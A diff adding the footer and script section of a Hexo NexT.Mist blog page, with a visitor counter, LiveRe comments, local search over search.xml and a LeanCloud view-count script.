+        <div class="copyright">
+  
+  &copy;  2016 - 
+  <span itemprop="copyrightYear">2018</span>
+  <span class="with-love">
+<!--
+    <i class="fa fa-heart"></i>
+-->
+	<i class="fa fa-address-card-o" aria-hidden="true"></i>
+  </span>
+  <span class="author" itemprop="copyrightHolder">RcoIl</span>
+</div>
+<!--
+
+<div class="powered-by">
+  由 <a class="theme-link" href="https://hexo.io">Hexo</a> 强力驱动
+</div>
+
+<div class="theme-info">
+  主题 -
+  <a class="theme-link" href="https://github.com/iissnan/hexo-theme-next">
+    NexT.Mist
+  </a>
+</div>
+-->
+
+
+        
+<div class="busuanzi-count">
+  <script async src="https://dn-lbstatics.qbox.me/busuanzi/2.3/busuanzi.pure.mini.js"></script>
+
+  
+    <span class="site-uv">
+      <i class="fa fa-blind" aria-hidden="true"></i>本站访客数
+      <span class="busuanzi-value" id="busuanzi_value_site_uv"></span>
+      人
+    </span>
+  
+
+  
+    <span class="site-pv">
+      <i class="fa fa-user-md" aria-hidden="true"></i>本站总访问量
+      <span class="busuanzi-value" id="busuanzi_value_site_pv"></span>
+      次
+    </span>
+  
+</div>
+
+
+        
+      </div>
+    </footer>
+
+    
+      <div class="back-to-top">
+        <i class="fa fa-arrow-up"></i>
+        
+      </div>
+    
+
+  </div>
+
+  
+
+<script type="text/javascript">
+  if (Object.prototype.toString.call(window.Promise) !== '[object Function]') {
+    window.Promise = null;
+  }
+</script>
+
+
+
+
+
+
+
+
+
+  
+
+
+
+
+
+
+  
+  <script type="text/javascript" src="/lib/jquery/index.js?v=2.1.3"></script>
+
+  
+  <script type="text/javascript" src="/lib/fastclick/lib/fastclick.min.js?v=1.0.6"></script>
+
+  
+  <script type="text/javascript" src="/lib/jquery_lazyload/jquery.lazyload.js?v=1.9.7"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/velocity/velocity.ui.min.js?v=1.2.1"></script>
+
+  
+  <script type="text/javascript" src="/lib/fancybox/source/jquery.fancybox.pack.js?v=2.1.5"></script>
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/utils.js?v=5.1.0"></script>
+
+  <script type="text/javascript" src="/js/src/motion.js?v=5.1.0"></script>
+
+
+
+  
+  
+
+  
+  <script type="text/javascript" src="/js/src/scrollspy.js?v=5.1.0"></script>
+<script type="text/javascript" src="/js/src/post-details.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  <script type="text/javascript" src="/js/src/bootstrap.js?v=5.1.0"></script>
+
+
+
+  
+
+
+  
+
+
+
+
+	
+
+
+
+
+
+  
+
+
+
+
+
+  
+
+
+
+
+
+  
+    <script type="text/javascript">
+      (function(d, s) {
+        var j, e = d.getElementsByTagName(s)[0];
+        if (typeof LivereTower === 'function') { return; }
+        j = d.createElement(s);
+        j.src = 'https://cdn-city.livere.com/js/embed.dist.js';
+        j.async = true;
+        e.parentNode.insertBefore(j, e);
+      })(document, 'script');
+    </script>
+  
+
+
+
+
+
+
+  
+
+  <script type="text/javascript">
+    // Popup Window;
+    var isfetched = false;
+    // Search DB path;
+    var search_path = "search.xml";
+    if (search_path.length == 0) {
+      search_path = "search.xml";
+    }
+    var path = "/" + search_path;
+    // monitor main search box;
+
+    function proceedsearch() {
+      $("body")
+        .append('<div class="search-popup-overlay local-search-pop-overlay"></div>')
+        .css('overflow', 'hidden');
+      $('.popup').toggle();
+    }
+    // search function;
+    var searchFunc = function(path, search_id, content_id) {
+      'use strict';
+      $.ajax({
+        url: path,
+        dataType: "xml",
+        async: true,
+        success: function( xmlResponse ) {
+          // get the contents from search data
+          isfetched = true;
+          $('.popup').detach().appendTo('.header-inner');
+          var datas = $( "entry", xmlResponse ).map(function() {
+            return {
+              title: $( "title", this ).text(),
+              content: $("content",this).text(),
+              url: $( "url" , this).text()
+            };
+          }).get();
+          var $input = document.getElementById(search_id);
+          var $resultContent = document.getElementById(content_id);
+          $input.addEventListener('input', function(){
+            var matchcounts = 0;
+            var str='<ul class=\"search-result-list\">';
+            var keywords = this.value.trim().toLowerCase().split(/[\s\-]+/);
+            $resultContent.innerHTML = "";
+            if (this.value.trim().length > 1) {
+              // perform local searching
+              datas.forEach(function(data) {
+                var isMatch = false;
+                var content_index = [];
+                var data_title = data.title.trim().toLowerCase();
+                var data_content = data.content.trim().replace(/<[^>]+>/g,"").toLowerCase();
+                var data_url = decodeURIComponent(data.url);
+                var index_title = -1;
+                var index_content = -1;
+                var first_occur = -1;
+                // only match artiles with not empty titles and contents
+                if(data_title != '') {
+                  keywords.forEach(function(keyword, i) {
+                    index_title = data_title.indexOf(keyword);
+                    index_content = data_content.indexOf(keyword);
+                    if( index_title >= 0 || index_content >= 0 ){
+                      isMatch = true;
+                      if (i == 0) {
+                        first_occur = index_content;
+                      }
+                    }
+
+                  });
+                }
+                // show search results
+                if (isMatch) {
+                  matchcounts += 1;
+                  str += "<li><a href='"+ data_url +"' class='search-result-title'>"+ data_title +"</a>";
+                  var content = data.content.trim().replace(/<[^>]+>/g,"");
+                  if (first_occur >= 0) {
+                    // cut out 100 characters
+                    var start = first_occur - 20;
+                    var end = first_occur + 80;
+                    if(start < 0){
+                      start = 0;
+                    }
+                    if(start == 0){
+                      end = 50;
+                    }
+                    if(end > content.length){
+                      end = content.length;
+                    }
+                    var match_content = content.substring(start, end);
+                    // highlight all keywords
+                    keywords.forEach(function(keyword){
+                      var regS = new RegExp(keyword, "gi");
+                      match_content = match_content.replace(regS, "<b class=\"search-keyword\">"+keyword+"</b>");
+                    });
+
+                    str += "<p class=\"search-result\">" + match_content +"...</p>"
+                  }
+                  str += "</li>";
+                }
+              })};
+            str += "</ul>";
+            if (matchcounts == 0) { str = '<div id="no-result"><i class="fa fa-frown-o fa-5x" /></div>' }
+            if (keywords == "") { str = '<div id="no-result"><i class="fa fa-search fa-5x" /></div>' }
+            $resultContent.innerHTML = str;
+          });
+          proceedsearch();
+        }
+      });}
+
+    // handle and trigger popup window;
+    $('.popup-trigger').click(function(e) {
+      e.stopPropagation();
+      if (isfetched == false) {
+        searchFunc(path, 'local-search-input', 'local-search-result');
+      } else {
+        proceedsearch();
+      };
+    });
+
+    $('.popup-btn-close').click(function(e){
+      $('.popup').hide();
+      $(".local-search-pop-overlay").remove();
+      $('body').css('overflow', '');
+    });
+    $('.popup').click(function(e){
+      e.stopPropagation();
+    });
+  </script>
+
+
+
+
+
+  
+
+  
+  <script src="https://cdn1.lncld.net/static/js/av-core-mini-0.6.1.js"></script>
+  <script>AV.initialize("KVNdpVifyFqJPx0bzSg6cN7z-gzGzoHsz", "vlNRwqLbdUTKC1W06gjYj0iG");</script>
+  <script>
+    function showTime(Counter) {
+      var query = new AV.Query(Counter);
+      var entries = [];
+      var $visitors = $(".leancloud_visitors");
+
+      $visitors.each(function () {
+        entries.push( $(this).attr("id").trim() );
+      });
+
+      query.containedIn('url', entries);
+      query.find()
+        .done(function (results) {
+          var COUNT_CONTAINER_REF = '.leancloud-visitors-count';
+
+          if (results.length === 0) {
+            $visitors.find(COUNT_CONTAINER_REF).text(0);
+            return;
+          }
+
+          for (var i = 0; i < results.length; i++) {
+            var item = results[i];
+            var url = item.get('url');
+            var time = item.get('time');
+            var element = document.getElementById(url);
+
+            $(element).find(COUNT_CONTAINER_REF).text(time);
+          }
+          for(var i = 0; i < entries.length; i++) {
+            var url = entries[i];
+            var element = document.getElementById(url);
+            var countSpan = $(element).find(COUNT_CONTAINER_REF);
+            if( countSpan.text() == '') {
+              countSpan.text(0);
+            }
+          }
+        })
+        .fail(function (object, error) {
+          console.log("Error: " + error.code + " " + error.message);
+        });
+    }
+
+    function addCount(Counter) {
+      var $visitors = $(".leancloud_visitors");
+      var url = $visitors.attr('id').trim();
+      var title = $visitors.attr('data-flag-title').trim();
+      var query = new AV.Query(Counter);
+
+      query.equalTo("url", url);
+      query.find({
+        success: function(results) {
+          if (results.length > 0) {
+            var counter = results[0];
+            counter.fetchWhenSave(true);
+            counter.increment("time");
+            counter.save(null, {
+              success: function(counter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(counter.get('time'));
+              },
+              error: function(counter, error) {
+                console.log('Failed to save Visitor num, with error message: ' + error.message);
+              }
+            });
+          } else {
+            var newcounter = new Counter();
+            /* Set ACL */
+            var acl = new AV.ACL();
+            acl.setPublicReadAccess(true);
+            acl.setPublicWriteAccess(true);
+            newcounter.setACL(acl);
+            /* End Set ACL */
+            newcounter.set("title", title);
+            newcounter.set("url", url);
+            newcounter.set("time", 1);
+            newcounter.save(null, {
+              success: function(newcounter) {
+                var $element = $(document.getElementById(url));
+                $element.find('.leancloud-visitors-count').text(newcounter.get('time'));
+              },
+              error: function(newcounter, error) {
+                console.log('Failed to create');
+              }
+            });
+          }
+        },
+        error: function(error) {
+          console.log('Error:' + error.code + " " + error.message);
+        }
+      });
+    }
+
+    $(function() {
+      var Counter = AV.Object.extend("Counter");
+      if ($('.leancloud_visitors').length == 1) {
+        addCount(Counter);
+      } else if ($('.post-title-link').length > 1) {
+        showTime(Counter);
+      }
+    });
+  </script>
+
+
+
+  
+
+  
+
+  
+
+</body>
+</html>
